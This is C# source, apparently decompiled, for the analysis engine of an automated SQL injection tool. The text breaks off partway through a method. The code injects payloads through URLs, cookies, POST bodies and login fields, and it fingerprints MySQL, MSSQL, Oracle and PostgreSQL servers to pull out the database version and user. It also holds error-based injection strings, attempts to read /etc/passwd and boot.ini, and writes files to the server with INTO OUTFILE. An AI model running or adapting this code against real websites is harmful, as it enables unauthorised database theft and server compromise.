using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

public class Analizer
{
	public enum InjectionPoint : byte
	{
		URL,
		Cookies,
		POST,
		LoginUser,
		LoginPassword
	}
	private struct HTMLParams
	{
		public string URL;
		public string Cookies;
		public string POST;
		public string LoginUser;
		public string LoginPassword;
	}

    private class ThreadControl
    {
        public string Keyword
        {
            get;
            set;
        }
        public Thread Thread
        {
            get;
            set;
        }
        public string Traject
        {
            get;
            set;
        }
        public int UnionPostion
        {
            get;
            set;
        }
        public string UnionString
        {
            get;
            set;
        }
        public ThreadControl()
        {
        }
    }

	private int __Threads;
	private int __TimeOut;
	private int __Delay;
	private int __Retry;
	private enHTTPMethod __HTTPMethod;
	private Analizer.InjectionPoint __InjectionPoint;
	private List<string> __Unions;
	private int __UnionStart;
	private int __UnionEnd;
	private bool __CheckErrorBasead;
	private bool __CheckUnionInteger;
	private bool __CheckUnionKeyword;
	private bool __CheckUnionInMySQL_Error;
	private bool __CheckUnionInMSSQL_Error;

	[CompilerGenerated]
	private string _URL;

	[CompilerGenerated]
	private string _Cookies;

	[CompilerGenerated]
	private string _POST;

	[CompilerGenerated]
	private string _LoginUser;

	[CompilerGenerated]
	private string _LoginPassword;

	private bool __Cancel;

	private bool __Paused;

	[CompilerGenerated]
	private bool _Running;

	[CompilerGenerated]
	private Types _SQLType;

	private ThreadPool __ThreadPoolAnalizer;

	private bool __CheckErrorPoints;

	private bool __RetryExceded;

	private bool __IsFullAnalized;

	[CompilerGenerated]
	private MySQLErrorType _MySQLErrorType;

	[CompilerGenerated]
	private MySQLCollactions _MySQLCollactions;

	[CompilerGenerated]
	private OracleErrorType _OracleErrorType;

	[CompilerGenerated]
	private bool _OracleCast;

	[CompilerGenerated]
	private bool _MSSQLCollate;

	[CompilerGenerated]
	private string _MSSQLCast;

	[CompilerGenerated]
	private string _WebServer;

	[CompilerGenerated]
	private string _InjectQuery;

	[CompilerGenerated]
	private int _UnionCount;

	[CompilerGenerated]
	private int _UnionString;

	[CompilerGenerated]
	private InjectionType _Result;

	[CompilerGenerated]
	private object _Tag;

    public event Analizer.OnCompleteEventHandler OnCompleteEvent;
    public event Analizer.OnProgressEventHandler OnProgressEvent;
    public event Analizer.OnStartEventHandler OnStartEvent;

    public delegate void OnCompleteEventHandler(Analizer sender);
    public delegate void OnProgressEventHandler(string sDesc, int iPerc, Analizer sender);
    public delegate void OnStartEventHandler(Analizer sender);

    private const string LOADING_STR = "Analizer thread, ";
	private const string ERROR_INTEGER = "[t]";
	private const string ERROR_INTEGER_1 = "[t] and 1=1";
	private const string ERROR_INTEGER_2 = " or 1=[t] and 1=1";
	private const string ERROR_INTEGER_3 = " and [t] and 1=1";
	private const string ERROR_STRING = "' [t] '";
	private const string ERROR_STRING_1 = "' and [t] and '1'='1";
	private const string ERROR_STRING_2 = "' or 1=[t] and '1'='1";
	private const string ERROR_STRING_3 = "' or 1=[t]--";
	private long CheckRequestDelay_LastTick;
	private StaticLocalInitFlag CheckRequestDelay_LastTick_Init;

	public string URL
	{
		get
		{
			return this._URL;
		}
		set
		{
			this._URL = value;
		}
	}

	public string Cookies
	{
		get
		{
			return this._Cookies;
		}
		set
		{
			this._Cookies = value;
		}
	}

	public string POST
	{
		get
		{
			return this._POST;
		}
		set
		{
			this._POST = value;
		}
	}
	public string LoginUser
	{
		get
		{
			return this._LoginUser;
		}
		set
		{
			this._LoginUser = value;
		}
	}
	public string LoginPassword
	{
		get
		{
			return this._LoginPassword;
		}
		set
		{
			this._LoginPassword = value;
		}
	}
	public bool Running
	{
		get
		{
			return this._Running;
		}
		set
		{
			this._Running = value;
		}
	}
	public Types SQLType
	{
		get
		{
			return this._SQLType;
		}
		set
		{
			this._SQLType = value;
		}
	}
	public MySQLErrorType MySQLErrorType
	{
		get
		{
			return this._MySQLErrorType;
		}
		set
		{
			this._MySQLErrorType = value;
		}
	}
	public MySQLCollactions MySQLCollactions
	{
		get
		{
			return this._MySQLCollactions;
		}
		set
		{
			this._MySQLCollactions = value;
		}
	}
	public OracleErrorType OracleErrorType
	{
		get
		{
			return this._OracleErrorType;
		}
		set
		{
			this._OracleErrorType = value;
		}
	}
	public bool OracleCast
	{
		get
		{
			return this._OracleCast;
		}
		set
		{
			this._OracleCast = value;
		}
	}
	public bool MSSQLCollate
	{
		get
		{
			return this._MSSQLCollate;
		}
		set
		{
			this._MSSQLCollate = value;
		}
	}
	public string MSSQLCast
	{
		get
		{
			return this._MSSQLCast;
		}
		set
		{
			this._MSSQLCast = value;
		}
	}
	public string WebServer
	{
		get
		{
			return this._WebServer;
		}
		set
		{
			this._WebServer = value;
		}
	}
	public string InjectQuery
	{
		get
		{
			return this._InjectQuery;
		}
		set
		{
			this._InjectQuery = value;
		}
	}
	public int UnionCount
	{
		get
		{
			return this._UnionCount;
		}
		set
		{
			this._UnionCount = value;
		}
	}
	public int UnionString
	{
		get
		{
			return this._UnionString;
		}
		set
		{
			this._UnionString = value;
		}
	}
	public InjectionType Result
	{
		get
		{
			return this._Result;
		}
		set
		{
			this._Result = value;
		}
	}
	public object Tag
	{
		get
		{
			return this._Tag;
		}
		set
		{
			this._Tag = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public Analizer(int iThreads, int iTimeOut, int iDelay, int iRetry, bool bCheckErrorPoints = false)
    {
        string str = "";
        this.URL = str;
        str = "";
        this.Cookies = str;
        str = "";
        this.POST = str;
        str = "";
        this.LoginUser = str;
        str = "";
        this.LoginPassword = str;
        this.SQLType = Types.Unknown;
        this.MySQLCollactions = DataBase.MySQLCollactions.UnHex; // UnHex
        this.OracleCast = false;
        str = "char";
        this.MSSQLCast = str;
        this.CheckRequestDelay_LastTick_Init = new StaticLocalInitFlag();
        this.__Threads = iThreads;
        this.__TimeOut = iTimeOut;
        this.__Delay = iDelay;
        this.__Retry = iRetry;
        this.__CheckErrorPoints = bCheckErrorPoints;
    }

    [DebuggerStepThrough, CompilerGenerated]
    private void _Lambda__16(object a0)
    {
        this.TryUnionPosition((ThreadControl) a0);
    }

    [DebuggerStepThrough, CompilerGenerated]
    private void _Lambda__17(object a0)
    {
        this.TryUnionPositionKeyword((ThreadControl) a0);
    }

    public static List<string> BuildTraject(string sInputUrl, string sCode, bool bPreverserValue = false)
    {
        string str;
        int num = 0;
        new List<string>();
        List<string> list2 = new List<string>();
        if (sInputUrl.Contains("=") | sInputUrl.Contains("&"))
        {
            int num4 = sInputUrl.Length - 1;
            for (int i = 0; i <= num4; i++)
            {
                int num2 = 0;
                switch (sInputUrl.Substring(i, 1))
                {
                    case "=":
                        num = i;
                        break;

                    case "&":
                        num2 = i;
                        break;
                }
                if (i == (sInputUrl.Length - 1))
                {
                    num2 = i + 1;
                }
                if ((num > 0) & (num2 > 0))
                {
                    if (bPreverserValue)
                    {
                        str = sInputUrl.Insert(num2, sCode);
                    }
                    else
                    {
                        str = sInputUrl.Remove(num + 1, (num2 - num) - 1).Insert(num + 1, sCode);
                    }
                    num = 0;
                    num2 = 0;
                    list2.Add(str);
                }
            }
            return list2;
        }
        num = sInputUrl.LastIndexOf("/");
        if (num > 0)
        {
            if (bPreverserValue)
            {
                str = sInputUrl + sCode;
            }
            else
            {
                str = sInputUrl.Substring(0, num + 1) + sCode;
            }
        }
        else
        {
            str = sInputUrl + sCode;
        }
        list2.Add(str);
        return list2;
    }

    public void Cancel()
    {
        this.__Cancel = true;
    }

    private bool CheckCollactions(string sTraject, InjectionType oType, Types oSQL)
    {
        bool flag = false;
        /*try
        {*/
            int num = 0;
            HTMLParams @params;
            bool flag4;
            bool flag5;
            bool flag6;
            string str = "";
            List<string> lColumn = new List<string>();
            bool flag3 = true;
            if (true == Utls.TypeIsMySQL(oSQL))
            {
                lColumn.Add("version()");
            }
            else if (flag3 == Utls.TypeIsMSSQL(oSQL))
            {
                lColumn.Add("@@version");
            }
            else if (flag3 == Utls.TypeIsOracle(oSQL))
            {
                lColumn.Add("(select user from dual)");
            }
            else
            {
                if (flag3 != Utls.TypeIsPostgreSQL(oSQL))
                {
                    return false;
                }
                lColumn.Add("version()");
            }
            if ((oType == InjectionType.Error) && Utls.TypeIsOracle(oSQL))
            {
                this.OracleErrorType = DataBase.OracleErrorType.GET_HOST_ADDRESS;
            }
            goto Label_0699;
        Label_008A:
            if (flag4 == Utls.TypeIsMSSQL(oSQL))
            {
                switch (num)
                {
                    case 0:
                        str = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "char", "");
                        this.MSSQLCast = "char";
                        goto Label_023B;

                    case 1:
                        str = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "", "");
                        this.MSSQLCast = "";
                        goto Label_023B;

                    case 2:
                        str = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "nvarchar", "");
                        this.MSSQLCast = "nvarchar";
                        goto Label_023B;

                    case 3:
                        this.MSSQLCollate = false;
                        str = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "char", "");
                        this.MSSQLCast = "char";
                        goto Label_023B;

                    case 4:
                        str = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "", "");
                        this.MSSQLCast = "";
                        goto Label_023B;
                }
                return flag;
            }
            if (flag4 == Utls.TypeIsOracle(oSQL))
            {
                switch (num)
                {
                    case 0:
                        str = Oracle.Info(sTraject, oType, this.OracleErrorType, lColumn, this.OracleCast, "");
                        goto Label_023B;

                    case 1:
                        this.OracleCast = !this.OracleCast;
                        str = Oracle.Info(sTraject, oType, this.OracleErrorType, lColumn, this.OracleCast, "");
                        goto Label_023B;
                }
                return flag;
            }
            if (flag4 == Utls.TypeIsPostgreSQL(oSQL))
            {
                if (oType == InjectionType.Union)
                {
                    switch (num)
                    {
                        case 0:
                            return flag;
                    }
                    str = PostgreSQL.Info(sTraject, oType, PostgreSQLErrorType.NONE, lColumn, "");
                }
                else
                {
                    switch (num)
                    {
                        case 0:
                            return flag;
                    }
                    str = PostgreSQL.Info(sTraject, oType, PostgreSQLErrorType.CAST_INT, lColumn, "");
                }
            }
        Label_023B:
            @params = new HTMLParams();
            @params.URL = this.URL;
            @params.Cookies = this.Cookies;
            @params.POST = this.POST;
            @params.LoginUser = this.LoginUser;
            @params.LoginPassword = this.LoginPassword;
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    @params.URL = str;
                    break;

                case InjectionPoint.Cookies:
                    @params.Cookies = str;
                    break;

                case InjectionPoint.POST:
                    @params.POST = str;
                    break;

                case InjectionPoint.LoginUser:
                    @params.LoginUser = str;
                    break;

                case InjectionPoint.LoginPassword:
                    @params.LoginPassword = str;
                    break;
            }
            str = this.LoadHTML(@params);
            if (string.IsNullOrEmpty(str))
            {
                return flag;
            }
            List<string> list2 = new List<string>();
            switch (oType)
            {
                case InjectionType.Union:
                    flag5 = true;
                    if (true != Utls.TypeIsMySQL(oSQL))
                    {
                        break;
                    }
                    list2 = Globals.G_Dumper.ParseHtmlData(str, Types.MySQL_No_Error);
                    goto Label_03F6;

                case InjectionType.Error:
                    flag6 = true;
                    if (true != Utls.TypeIsMySQL(oSQL))
                    {
                        goto Label_03A5;
                    }
                    list2 = Globals.G_Dumper.ParseHtmlData(str, Types.MySQL_With_Error);
                    goto Label_03F6;

                default:
                    goto Label_03F6;
            }
            if (flag5 == Utls.TypeIsMSSQL(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.MSSQL_No_Error);
            }
            else if (flag5 == Utls.TypeIsOracle(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.Oracle_No_Error);
            }
            else if (flag5 == Utls.TypeIsPostgreSQL(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.PostgreSQL_No_Error);
            }
            goto Label_03F6;
        Label_03A5:
            if (flag6 == Utls.TypeIsMSSQL(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.MSSQL_With_Error);
            }
            else if (flag6 == Utls.TypeIsOracle(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.Oracle_With_Error);
            }
            else if (flag6 == Utls.TypeIsPostgreSQL(oSQL))
            {
                list2 = Globals.G_Dumper.ParseHtmlData(str, Types.PostgreSQL_With_Error);
            }
        Label_03F6:
            flag = list2.Count > 0;
            if (this.PausedOrCanceled())
            {
                return flag;
            }
            if (flag)
            {
                return flag;
            }
            num++;
            goto Label_0699;
        Label_041B:
            if (oType == InjectionType.Union)
            {
                switch (num)
                {
                    case 0:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.None, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.None;
                        goto Label_023B;

                    case 1:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.UnHex, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.UnHex;
                        goto Label_023B;

                    case 2:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.Binary, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.Binary;
                        goto Label_023B;

                    case 3:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.CastAsChar, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.CastAsChar;
                        goto Label_023B;

                    case 4:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.Compress, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.Compress;
                        goto Label_023B;

                    case 5:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.ConvertUtf8, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.ConvertUtf8;
                        goto Label_023B;

                    case 6:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.ConvertLatin1, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.ConvertLatin1;
                        goto Label_023B;

                    case 7:
                        str = MySQLNoError.Info(sTraject, DataBase.MySQLCollactions.Aes_descrypt, false, lColumn, "");
                        this.MySQLCollactions = DataBase.MySQLCollactions.Aes_descrypt;
                        goto Label_023B;
                }
                return flag;
            }
            if ((num > 7) & !this.__IsFullAnalized)
            {
                switch (this.MySQLErrorType)
                {
                    case DataBase.MySQLErrorType.DuplicateEntry:
                        this.MySQLErrorType = DataBase.MySQLErrorType.ExtractValue;
                        break;

                    case DataBase.MySQLErrorType.ExtractValue:
                        this.MySQLErrorType = DataBase.MySQLErrorType.UpdateXML;
                        break;

                    case DataBase.MySQLErrorType.UpdateXML:
                        return flag;
                }
            }
            switch (num)
            {
                case 0:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.None, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.None;
                    goto Label_023B;

                case 1:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.UnHex, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.UnHex;
                    goto Label_023B;

                case 2:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.Binary, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.Binary;
                    goto Label_023B;

                case 3:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.CastAsChar, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.CastAsChar;
                    goto Label_023B;

                case 4:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.Compress, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.Compress;
                    goto Label_023B;

                case 5:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.ConvertUtf8, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.ConvertUtf8;
                    goto Label_023B;

                case 6:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.ConvertLatin1, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.ConvertLatin1;
                    goto Label_023B;

                case 7:
                    str = MySQLWithError.Info(sTraject, DataBase.MySQLCollactions.Aes_descrypt, this.MySQLErrorType, lColumn, "");
                    this.MySQLCollactions = DataBase.MySQLCollactions.Aes_descrypt;
                    goto Label_023B;

                default:
                    return flag;
            }
        Label_0699:
            flag4 = true;
            if (true != Utls.TypeIsMySQL(oSQL))
            {
                goto Label_008A;
            }
            goto Label_041B;
       /* }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }*/
        return flag;
    }

    public bool CheckLoadFileMySQL(string sTraject, ref string sPath)
    {
        bool flag = false;
        try
        {
            int num = 0;
            if (!string.IsNullOrEmpty(sPath))
            {
                goto Label_0077;
            }
            goto Label_004F;
        Label_000B:
            sPath = "c:/boot.ini";
        Label_0012:
            if (this.MySQL_LoadFile(sTraject, sPath))
            {
                return true;
            }
            if (this.PausedOrCanceled())
            {
                return flag;
            }
            num++;
            goto Label_004F;
        Label_002B:
            sPath = "c://boot.ini";
            goto Label_0012;
        Label_0034:
            sPath = @"d:\\boot.ini";
            goto Label_0012;
        Label_003D:
            sPath = @"c:\\boot.ini";
            goto Label_0012;
        Label_0046:
            sPath = "/etc/passwd";
            goto Label_0012;
        Label_004F:
            new List<string>();
            switch (num)
            {
                case 0:
                    goto Label_0046;

                case 1:
                    goto Label_003D;

                case 2:
                    goto Label_0034;

                case 3:
                    goto Label_002B;

                case 4:
                    goto Label_000B;

                default:
                    return flag;
            }
        Label_0077:
            flag = this.MySQL_LoadFile(sTraject, sPath);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        return flag;
    }

    public bool CheckMagicQuotes(string sTraject)
    {
        bool flag = false;
        try
        {
            string str2;
            OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
            if (onProgressEvent != null)
            {
                onProgressEvent("Analizer thread, Checking Magic Quotes", -1, this);
            }
            string str = "'ABC145ZQ62DWQAFPOIYCFD'";
            if ((this.SQLType == Types.Unknown) | (this.SQLType == Types.None))
            {
                this.SQLType = this.CheckTypeDB(sTraject);
            }
            bool flag3 = true;
            if (((true == Utls.TypeIsMySQL(this.SQLType)) || (flag3 == Utls.TypeIsMSSQL(this.SQLType))) || ((flag3 != Utls.TypeIsOracle(this.SQLType)) && (flag3 == Utls.TypeIsPostgreSQL(this.SQLType))))
            {
            }
            List<string> lColumn = new List<string> {
                str
            };
            switch (this.SQLType)
            {
                case Types.MySQL_No_Error:
                    str2 = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn, "");
                    break;

                case Types.MySQL_With_Error:
                    str2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn, "");
                    break;

                case Types.MSSQL_No_Error:
                    str2 = MSSQL.Info(sTraject, InjectionType.Union, this.MSSQLCollate, lColumn, this.MSSQLCast, "");
                    break;

                case Types.MSSQL_With_Error:
                    str2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, lColumn, this.MSSQLCast, "");
                    break;

                case Types.Oracle_No_Error:
                    str2 = Oracle.Info(sTraject, InjectionType.Error, DataBase.OracleErrorType.NONE, lColumn, true, "");
                    break;

                case Types.Oracle_With_Error:
                    str2 = Oracle.Info(sTraject, InjectionType.Union, DataBase.OracleErrorType.NONE, lColumn, true, "");
                    break;

                case Types.PostgreSQL_No_Error:
                    str2 = PostgreSQL.Info(sTraject, InjectionType.Union, PostgreSQLErrorType.NONE, lColumn, "");
                    break;

                case Types.PostgreSQL_With_Error:
                    str2 = PostgreSQL.Info(sTraject, InjectionType.Error, PostgreSQLErrorType.NONE, lColumn, "");
                    break;

                default:
                    return false;
            }
            HTMLParams p = new HTMLParams {
                URL = this.URL,
                Cookies = this.Cookies,
                POST = this.POST,
                LoginUser = this.LoginUser,
                LoginPassword = this.LoginPassword
            };
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    p.URL = str2;
                    break;

                case InjectionPoint.Cookies:
                    p.Cookies = str2;
                    break;

                case InjectionPoint.POST:
                    p.POST = str2;
                    break;

                case InjectionPoint.LoginUser:
                    p.LoginUser = str2;
                    break;

                case InjectionPoint.LoginPassword:
                    p.LoginPassword = str2;
                    break;
            }
            flag = this.LoadHTML(p).ToLower().Contains(str.ToLower());
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        return flag;
    }

    private void CheckRequestDelay()
	{
		bool flag = false;
		try
		{
			Monitor.Enter(this.CheckRequestDelay_LastTick_Init, ref flag);
			if (this.CheckRequestDelay_LastTick_Init.State == 0)
			{
				this.CheckRequestDelay_LastTick_Init.State = 2;
				this.CheckRequestDelay_LastTick = 1L;
			}
			else if (this.CheckRequestDelay_LastTick_Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this.CheckRequestDelay_LastTick_Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this.CheckRequestDelay_LastTick_Init);
			}
		}
		if (this.__Delay == 0)
		{
			return;
		}
		checked
		{
			while (true)
			{
				long num = (long)Math.Round((double)DateTime.UtcNow.Ticks / 10000.0);
				if (num - this.CheckRequestDelay_LastTick > unchecked((long)this.__Delay))
				{
					break;
				}
				Thread.Sleep(50);
			}
			this.CheckRequestDelay_LastTick = (long)Math.Round((double)DateTime.UtcNow.Ticks / 10000.0);
		}
	}

    public bool CheckServerInfo(string sTraject, ref string sVersion, ref string sUser, bool bOnlyVersion = false)
    {
        bool flag = false;
        try
        {
            InjectionType union;
            OnProgressEventHandler onProgressEvent;
            string str = "";
            string[] strArray = new string[2];
            if (sTraject.ToLower().Contains("union".ToLower()))
            {
                union = InjectionType.Union;
            }
            else
            {
                union = InjectionType.Error;
            }
            if (this.SQLType == Types.None)
            {
                this.SQLType = this.CheckTypeDB(sTraject);
            }
            if (!Utls.TypeIsInjecatble(this.SQLType))
            {
                onProgressEvent = this.OnProgressEvent;
                if (onProgressEvent != null)
                {
                    onProgressEvent("Analizer thread, Checking inject params..", -1, this);
                }
                if (!Utls.TypeIsInjecatble(this.SQLType))
                {
                    return false;
                }
                if (sTraject.ToLower().Contains("union".ToLower()))
                {
                    if (!this.TestUnion(sTraject))
                    {
                        return false;
                    }
                }
                else if (!this.TryErrorBasead(sTraject))
                {
                    return false;
                }
            }
            if (!this.CheckCollactions(sTraject, union, this.SQLType))
            {
                return false;
            }
            int index = 0;
            while (!(bOnlyVersion & (index == 0)))
            {
                if (index == 0)
                {
                    onProgressEvent = this.OnProgressEvent;
                    if (onProgressEvent != null)
                    {
                        onProgressEvent("Analizer thread, Checking Server Info (version)", -1, this);
                    }
                }
                else
                {
                    onProgressEvent = this.OnProgressEvent;
                    if (onProgressEvent != null)
                    {
                        onProgressEvent("Analizer thread, Checking Server Info (user)", -1, this);
                    }
                }
                bool flag3 = true;
                if (true == Utls.TypeIsMySQL(this.SQLType))
                {
                    strArray[0] = "user()";
                    strArray[1] = "version()";
                }
                else if (flag3 == Utls.TypeIsMSSQL(this.SQLType))
                {
                    strArray[0] = "system_user";
                    strArray[1] = "@@version";
                }
                else if (flag3 == Utls.TypeIsOracle(this.SQLType))
                {
                    strArray[0] = "(select user from dual)";
                    strArray[1] = "(select banner from v$version where banner like " + Globals.G_Utilities.ConvertTextToSQLChar("%Oracle%", false, "||", "chr") + ")";
                }
                else if (flag3 == Utls.TypeIsPostgreSQL(this.SQLType))
                {
                    strArray[0] = "user";
                    strArray[1] = "version()";
                }
                List<string> lColumn = new List<string> {
                    strArray[index]
                };
                switch (this.SQLType)
                {
                    case Types.MySQL_No_Error:
                        str = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn, "");
                        break;

                    case Types.MySQL_With_Error:
                        str = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn, "");
                        break;

                    case Types.MSSQL_No_Error:
                        str = MSSQL.Info(sTraject, InjectionType.Union, this.MSSQLCollate, lColumn, this.MSSQLCast, "");
                        break;

                    case Types.MSSQL_With_Error:
                        str = MSSQL.Info(sTraject, union, this.MSSQLCollate, lColumn, this.MSSQLCast, "");
                        break;

                    case Types.Oracle_No_Error:
                        str = Oracle.Info(sTraject, InjectionType.Union, this.OracleErrorType, lColumn, this.OracleCast, "");
                        break;

                    case Types.Oracle_With_Error:
                        str = Oracle.Info(sTraject, union, this.OracleErrorType, lColumn, this.OracleCast, "");
                        break;

                    case Types.PostgreSQL_No_Error:
                        str = PostgreSQL.Info(sTraject, InjectionType.Union, PostgreSQLErrorType.NONE, lColumn, "");
                        break;

                    case Types.PostgreSQL_With_Error:
                        str = PostgreSQL.Info(sTraject, union, PostgreSQLErrorType.CAST_INT, lColumn, "");
                        break;
                }
                HTMLParams p = new HTMLParams {
                    URL = this.URL,
                    Cookies = this.Cookies,
                    POST = this.POST,
                    LoginUser = this.LoginUser,
                    LoginPassword = this.LoginPassword
                };
                switch (this.__InjectionPoint)
                {
                    case InjectionPoint.URL:
                        p.URL = str;
                        break;

                    case InjectionPoint.Cookies:
                        p.Cookies = str;
                        break;

                    case InjectionPoint.POST:
                        p.POST = str;
                        break;

                    case InjectionPoint.LoginUser:
                        p.LoginUser = str;
                        break;

                    case InjectionPoint.LoginPassword:
                        p.LoginPassword = str;
                        break;
                }
                str = this.LoadHTML(p);
                if (!string.IsNullOrEmpty(str))
                {
                    List<string> list2 = Globals.G_Dumper.ParseHtmlData(str, this.SQLType);
                    if (list2.Count > 0)
                    {
                        string[] strArray2 = Strings.Split(list2[0], Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                        if (index == 0)
                        {
                            sUser = strArray2[0];
                        }
                        else
                        {
                            sVersion = strArray2[0];
                        }
                        flag = true;
                    }
                }
                if (this.PausedOrCanceled())
                {
                    goto Label_03F5;
                }
            Label_03DB:
                index++;
                if (index > 1)
                {
                    goto Label_03F5;
                }
            }
            //goto Label_03DB;
        Label_03F5:
            sVersion = sVersion.Replace("Microsoft SQL Server", "MS SQL");
            if (sVersion.IndexOf("\n") > 0)
            {
                sVersion = sVersion.Replace("\n", ", ");
            }
            if (sVersion.IndexOf("\v\n") > 0)
            {
                sVersion = sVersion.Replace("\v\n", ", ");
            }
            if (sVersion.IndexOf("\r") > 0)
            {
                sVersion = sVersion.Replace("\r", ", ");
            }
            if (sVersion.IndexOf("\r\n") > 0)
            {
                sVersion = sVersion.Replace("\r\n", ", ");
            }
            if (sUser.IndexOf("\n") > 0)
            {
                sUser = sUser.Split(new char[] { '\n' })[0].Trim();
            }
            if (sUser.IndexOf("\v\n") > 0)
            {
                sUser = sUser.Split(new char[] { '\v' })[0].Trim();
            }
            if (sUser.IndexOf("\r") > 0)
            {
                sUser = sUser.Split(new char[] { '\r' })[0].Trim();
            }
            if (sUser.IndexOf("\r\n") > 0)
            {
                sUser = sUser.Split(new char[] { '\r' })[0].Trim();
            }
            sVersion = sVersion.Replace("!~!", "");
            sVersion = sVersion.Replace("1!~!", "");
            sUser = sUser.Replace("!~!", "");
            sUser = sUser.Replace("1!~!", "");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        return flag;
    }

    private Types CheckTypeDB(string sTraject)
    {
        HTMLParams p = new HTMLParams {
            URL = this.URL,
            Cookies = this.Cookies,
            POST = this.POST,
            LoginUser = this.LoginUser,
            LoginPassword = this.LoginPassword
        };
        sTraject = sTraject.Replace(" and [t]", "'0=A");
        sTraject = sTraject.Replace("[t]", "'0=A");
        switch (this.__InjectionPoint)
        {
            case InjectionPoint.URL:
                p.URL = sTraject;
                break;

            case InjectionPoint.Cookies:
                p.Cookies = sTraject;
                break;

            case InjectionPoint.POST:
                p.POST = sTraject;
                break;

            case InjectionPoint.LoginUser:
                p.LoginUser = sTraject;
                break;

            case InjectionPoint.LoginPassword:
                p.LoginPassword = sTraject;
                break;
        }
        return Utls.CheckSyntaxError(this.LoadHTML(p));
    }

    public bool CheckWriteMySQL(string sTraject, bool bLinux, ref string sPath, bool bOutfile = true)
    {
        bool flag = false;
        try
        {
            int num = 0;
            string str;
            string str2;
            HTMLParams @params;
            string str3 = DateAndTime.Now.Ticks.ToString() + ".tmp";
            goto Label_0294;
        Label_0028:
            switch (num)
            {
                case 0:
                    sPath = @"c:\\";
                    break;

                case 1:
                    sPath = @"d:\\";
                    break;

                case 2:
                    sPath = @"e:\\";
                    break;

                case 3:
                    sPath = "";
                    break;

                default:
                    return false;
            }
        Label_0065:
            sPath = sPath + str3;
            if (bOutfile)
            {
                str = " into outfile '" + sPath + "'";
            }
            else
            {
                str = " into dumpfile '" + sPath + "'";
            }
            int num6 = str2.Length - 1;
            int index = str2.IndexOf("[t]");
            while (index <= num6)
            {
                bool flag3 = false;
                flag3 = str2.Substring(index, 1).Equals("&");
                if ((index + 1) <= (str2.Length - 1))
                {
                    flag3 |= str2.Substring(index, 2).Equals("--");
                }
                if ((index + 3) <= (str2.Length - 1))
                {
                    flag3 |= str2.Substring(index, 4).Equals("/--/");
                }
                if (flag3)
                {
                    goto Label_0130;
                }
                index++;
            }
            goto Label_013C;
        Label_0130:
            str2 = str2.Insert(index, str);
        Label_013C:
            if (!str2.Contains(str))
            {
                str2 = str2 + str;
            }
            List<string> lColumn = new List<string> {
                Globals.G_Utilities.ConvertTextToHex("1922312454")
            };
            switch (this.SQLType)
            {
                case Types.MySQL_No_Error:
                    str2 = MySQLNoError.Info(str2, this.MySQLCollactions, false, lColumn, "");
